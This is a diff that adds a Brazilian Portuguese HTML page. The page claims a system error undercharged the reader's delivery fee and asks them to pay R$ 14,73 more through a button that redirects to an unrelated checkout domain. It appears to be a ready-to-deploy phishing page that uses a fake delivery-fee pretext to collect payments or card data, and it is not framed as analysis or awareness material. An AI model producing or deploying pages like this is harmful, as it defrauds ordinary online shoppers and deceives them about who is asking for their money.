@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Correção na Taxa de Entrega</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fff9e6; /* Amarelo claro de fundo */
+            margin: 0;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        .container {
+            background: #ffffff;
+            padding: 25px;
+            max-width: 450px;
+            border-radius: 12px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            text-align: center;
+            border: 2px solid #FFD400;
+        }
+        h1 {
+            color: #FFD400;
+            font-size: 1.8em;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #000000;
+            font-size: 1em;
+            line-height: 1.4em;
+        }
+        h2 {
+            color: #000000;
+            margin-top: 15px;
+        }
+        .value-box {
+            background: #FFF5BF;
+            border: 1px solid #FFD400;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 8px;
+        }
+        .corrected-value {
+            font-size: 1.3em;
+            font-weight: bold;
+            color: #000000;
+        }
+        .call-to-action {
+            font-weight: bold;
+            margin-top: 15px;
+            color: #000000;
+        }
+        #payButton {
+            background: #FFD400;
+            color: #000000;
+            border: none;
+            padding: 14px 20px;
+            font-size: 1.1em;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        #payButton:hover {
+            background: #e6be00;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>⚠️ Correção na Taxa de Entrega</h1>   
+        <p>Olá! 😊</p>
+        <p>Identificamos um ajuste necessário na taxa de entrega do seu pedido. O valor original estava incorreto e precisamos regularizar para prosseguir com o envio.</p>
+
+        <h2>🔍 O que houve?</h2>
+        <p>Devido a um erro no sistema, a taxa foi calculada abaixo do valor real. Para garantir que seu pedido seja entregue sem atrasos, pedimos a atualização do pagamento.</p>
+
+        <div class="value-box">
+            <p>💳 Valor corrigido da entrega: <span class="corrected-value">R$ 14,73</span></p>
+            <p>(De acordo com a sua localização)</p>
+        </div>
+
+        <p class="call-to-action">✅ Clique no botão abaixo para realizar o pagamento agora:</p>
+        <button id="payButton">PAGAR TAXA DE ENTREGA</button>
+        <script>
+        document.getElementById('payButton').addEventListener('click', () => {
+            window.location.href = 'https://checkout.finalizar-pedido.online/VCCL1O8SD4DA';
+        });
+    </script>
+</body>
+</html>
+    </div>
